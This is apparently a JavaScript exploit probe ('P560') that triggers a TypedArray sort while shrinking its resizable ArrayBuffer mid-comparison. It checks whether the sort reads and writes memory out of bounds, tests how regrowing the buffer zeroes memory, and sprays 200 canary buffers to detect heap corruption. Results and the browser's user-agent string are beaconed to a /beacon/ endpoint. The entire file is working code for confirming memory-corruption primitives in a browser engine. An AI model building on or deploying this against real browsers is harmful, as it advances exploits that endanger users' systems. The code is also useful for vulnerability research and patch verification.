// CRASH_CLASS: MODERATE
// PROBE P560: Sort OOB Write Verification
//
// P559 confirmed: sort READS real data from OOB backing store positions.
// This probe tests whether sort also WRITES to OOB positions, and
// characterizes regrow zeroing behavior that controls observability.
//
// Tests:
//   A) Regrow zeroing: incremental grow from 32, check each new element
//   B) Post-sort readback: in-bounds arr[0-3] after ascending sort of mixed input
//   C) Sort + regrow + read OOB: direct observation of positions 4-15
//   D) Two-sort readback: sort #2's OOB read checks what sort #1 wrote
//   E) Canary spray: 200 ArrayBuffers checked for heap corruption
//   F) Control sort: no shrink, baseline comparison

document.write('<pre id="log" style="color:#0f0;background:#000;font:13px monospace;padding:8px;white-space:pre-wrap"></pre>');

(function () {
  var logEl = document.getElementById('log');
  function emit(tag, msg) {
    var line = tag + ' ' + msg;
    logEl.textContent += line + '\n';
    try {
      new Image().src = '/beacon/P560-' + encodeURIComponent(tag) +
        '?d=' + encodeURIComponent(String(msg).slice(0, 500));
    } catch (e) {}
  }

  emit('START', 'sort-oob-write ua=' + navigator.userAgent.slice(0, 60));

  try {
    var t = new ArrayBuffer(64, { maxByteLength: 256 });
    if (typeof t.resize !== 'function') { emit('NO-RAB', 'abort'); return; }
  } catch (e) { emit('NO-RAB', 'abort'); return; }
  emit('RAB-OK', 'supported');

  // ======================== TEST A: REGROW ZEROING ========================
  // Fill 16 Float64 with known values, shrink to 4, grow step-by-step.
  // At each step read the first newly-accessible element.
  // P = preserved (old data), Z = zeroed, ? = unexpected value.

  emit('PHASE-A', 'start');
  try {
    var rabA = new ArrayBuffer(128, { maxByteLength: 512 });
    var f64A = new Float64Array(rabA);
    for (var ia = 0; ia < 16; ia++) f64A[ia] = 700 + ia;
    rabA.resize(32);

    var sizes = [40, 48, 56, 64, 80, 96, 128];
    var res = [];
    var prev = 32;
    for (var gs = 0; gs < sizes.length; gs++) {
      rabA.resize(sizes[gs]);
      var idx = prev / 8;
      var v = f64A[idx];
      var exp = 700 + idx;
      res.push(idx + ':' + (v === 0 ? 'Z' : Math.abs(v - exp) < 0.01 ? 'P' : '?=' + v));
      prev = sizes[gs];
    }
    emit('A-INCR', res.join(','));

    var rabA2 = new ArrayBuffer(64, { maxByteLength: 256 });
    var f64A2 = new Float64Array(rabA2);
    for (var ia2 = 0; ia2 < 8; ia2++) f64A2[ia2] = 900 + ia2;
    rabA2.resize(16);
    rabA2.resize(64);
    var a2r = [];
    for (var ia3 = 2; ia3 < 8; ia3++) a2r.push(ia3 + ':' + f64A2[ia3]);
    emit('A-CYCLE', a2r.join(','));
  } catch (e) {
    emit('PHASE-A-ERR', String(e).slice(0, 120));
  }
  emit('PHASE-A', 'done');

  // ======================== TEST B: POST-SORT IN-BOUNDS READ ========================
  // Large values at positions 0-3, small (1-12) at 4-15.
  // Ascending sort should pull OOB small values into arr[0-3].
  // arr[0]=1 means sort integrated OOB data into its result.

  emit('PHASE-B', 'start');
  try {
    var rabB = new ArrayBuffer(128, { maxByteLength: 512 });
    var f64B = new Float64Array(rabB);
    f64B[0] = 16000; f64B[1] = 15000; f64B[2] = 14000; f64B[3] = 13000;
    for (var ib = 4; ib < 16; ib++) f64B[ib] = ib - 3;

    var bCalls = 0, bResized = false;
    try {
      f64B.sort(function (a, b) {
        bCalls++;
        if (bCalls === 5 && !bResized) {
          bResized = true;
          try { rabB.resize(32); } catch (e) {}
        }
        return a - b;
      });
    } catch (e) { emit('B-THREW', e.name); }

    var bPost = [];
    for (var bq = 0; bq < 4; bq++) bPost.push(f64B[bq]);
    emit('B-POST', bPost.join(','));
    emit('B-CALLS', String(bCalls));

    if (bPost[0] <= 12) {
      emit('B-INTEGRATED', 'OOB values landed in arr[0-3]');
    } else if (bPost[0] >= 13000) {
      emit('B-INBOUNDS-ONLY', 'only original in-bounds values sorted');
    } else {
      emit('B-MIXED', 'arr[0]=' + bPost[0]);
    }
  } catch (e) {
    emit('PHASE-B-ERR', String(e).slice(0, 120));
  }
  emit('PHASE-B', 'done');

  // ======================== TEST C: SORT + REGROW + READ OOB ========================
  // Sort, then grow back to 128, read positions 4-15 directly.
  // If non-zero: sort wrote AND regrow did not zero -> OOB WRITE CONFIRMED.
  // If all zero: regrow zeroed -> write is inconclusive from this test alone.

  emit('PHASE-C', 'start');
  try {
    var rabC = new ArrayBuffer(128, { maxByteLength: 512 });
    var f64C = new Float64Array(rabC);
    f64C[0] = 8000; f64C[1] = 7000; f64C[2] = 6000; f64C[3] = 5000;
    for (var ic = 4; ic < 16; ic++) f64C[ic] = (ic - 3) * 100;

    var cCalls = 0, cResized = false;
    try {
      f64C.sort(function (a, b) {
        cCalls++;
        if (cCalls === 5 && !cResized) {
          cResized = true;
          try { rabC.resize(32); } catch (e) {}
        }
        return a - b;
      });
    } catch (e) {}

    var cIn = [];
    for (var ci = 0; ci < 4; ci++) cIn.push(f64C[ci]);
    emit('C-IN', cIn.join(','));

    rabC.resize(128);
    var cOob = [];
    var cNZ = 0;
    for (var co = 4; co < 16; co++) {
      var cv = f64C[co];
      if (cv !== 0) cNZ++;
      cOob.push(cv);
    }
    emit('C-OOB', cOob.slice(0, 6).join(','));
    emit('C-NZ', cNZ + '/12');
    if (cNZ > 0) {
      emit('C-WRITE-YES', cOob.join(','));
    } else {
      emit('C-ZEROED', 'regrow erased evidence');
    }
  } catch (e) {
    emit('PHASE-C-ERR', String(e).slice(0, 120));
  }
  emit('PHASE-C', 'done');

  // ======================== TEST D: TWO-SORT READBACK ========================
  // Sort #1: sort with shrink (potentially writes to OOB).
  // Grow back, write markers to 0-3, leave 4-15 untouched.
  // Sort #2: sort with shrink again. Comparator captures OOB values.
  // If values from sort #1 appear -> writes survived regrow -> CONFIRMED.

  emit('PHASE-D', 'start');
  try {
    var rabD = new ArrayBuffer(128, { maxByteLength: 512 });
    var f64D = new Float64Array(rabD);
    f64D[0] = 8000; f64D[1] = 7000; f64D[2] = 6000; f64D[3] = 5000;
    for (var id = 4; id < 16; id++) f64D[id] = (id - 3) * 100;

    var dC1 = 0, dR1 = false;
    try {
      f64D.sort(function (a, b) {
        dC1++;
        if (dC1 === 5 && !dR1) { dR1 = true; try { rabD.resize(32); } catch (e) {} }
        return a - b;
      });
    } catch (e) {}

    emit('D-SORT1', [f64D[0], f64D[1], f64D[2], f64D[3]].join(','));

    rabD.resize(128);
    f64D[0] = -111; f64D[1] = -222; f64D[2] = -333; f64D[3] = -444;

    var dC2 = 0, dR2 = false;
    var d2P = [];
    try {
      f64D.sort(function (a, b) {
        dC2++;
        if (dC2 === 5 && !dR2) { dR2 = true; try { rabD.resize(32); } catch (e) {} }
        if (dR2 && d2P.length < 20) d2P.push(a.toFixed(0) + '/' + b.toFixed(0));
        return a - b;
      });
    } catch (e) {}

    emit('D-SORT2', 'calls=' + dC2 + ' pairs=' + d2P.length);
    if (d2P.length > 0) emit('D-PAIRS', d2P.slice(0, 8).join('|'));

    var hasOld = false;
    for (var dp = 0; dp < d2P.length; dp++) {
      var dps = d2P[dp].split('/');
      for (var di = 0; di < dps.length; di++) {
        var dn = parseFloat(dps[di]);
        if (dn >= 100 && dn <= 8000) { hasOld = true; break; }
      }
      if (hasOld) break;
    }
    emit(hasOld ? 'D-WRITE-YES' : 'D-ZEROED',
      hasOld ? 'sort1 values at OOB positions' : 'only markers and zeros');
  } catch (e) {
    emit('PHASE-D-ERR', String(e).slice(0, 120));
  }
  emit('PHASE-D', 'done');

  // ======================== TEST E: CANARY SPRAY ========================
  // 200 ArrayBuffer(128) filled with 0xDEADBEEF. Sort RAB with shrink.
  // If any canary word changed, sort wrote PAST the backing store allocation.

  emit('PHASE-E', 'start');
  try {
    var CANARY = 3735928559;
    var cans = [];
    for (var ce = 0; ce < 200; ce++) {
      var cb = new ArrayBuffer(128);
      var cu = new Uint32Array(cb);
      for (var cj = 0; cj < 32; cj++) cu[cj] = CANARY;
      cans.push(cu);
    }

    var rabE = new ArrayBuffer(128, { maxByteLength: 512 });
    var f64E = new Float64Array(rabE);
    for (var ie = 0; ie < 16; ie++) f64E[ie] = (16 - ie) * 7777;

    var eC = 0, eR = false;
    try {
      f64E.sort(function (a, b) {
        eC++;
        if (eC === 5 && !eR) { eR = true; try { rabE.resize(32); } catch (e) {} }
        return a - b;
      });
    } catch (e) {}

    var bad = 0;
    var det = [];
    for (var ck = 0; ck < cans.length; ck++) {
      for (var cl = 0; cl < 32; cl++) {
        if (cans[ck][cl] !== CANARY) {
          bad++;
          if (det.length < 4) det.push('c' + ck + '[' + cl + ']=0x' + (cans[ck][cl] >>> 0).toString(16));
          break;
        }
      }
    }
    emit('E-CANARY', 'n=' + cans.length + ' bad=' + bad);
    if (bad > 0) emit('E-OVERFLOW', det.join(','));
    else emit('E-CLEAN', 'no heap corruption');
  } catch (e) {
    emit('PHASE-E-ERR', String(e).slice(0, 120));
  }
  emit('PHASE-E', 'done');

  // ======================== TEST F: CONTROL (NO SHRINK) ========================
  // Same input as B, no shrink. Baseline for correct sort behavior.

  emit('PHASE-F', 'start');
  try {
    var rabF = new ArrayBuffer(128, { maxByteLength: 512 });
    var f64F = new Float64Array(rabF);
    f64F[0] = 16000; f64F[1] = 15000; f64F[2] = 14000; f64F[3] = 13000;
    for (var ifx = 4; ifx < 16; ifx++) f64F[ifx] = ifx - 3;

    var fC = 0;
    f64F.sort(function (a, b) { fC++; return a - b; });

    var fR = [];
    for (var jf = 0; jf < 16; jf++) fR.push(f64F[jf]);
    emit('F-CTRL', fR.slice(0, 4).join(',') + '..' + fR.slice(12).join(','));
    emit('F-CALLS', String(fC));
  } catch (e) {
    emit('PHASE-F-ERR', String(e).slice(0, 120));
  }
  emit('PHASE-F', 'done');

  emit('ALIVE', 'all tests completed');
})();
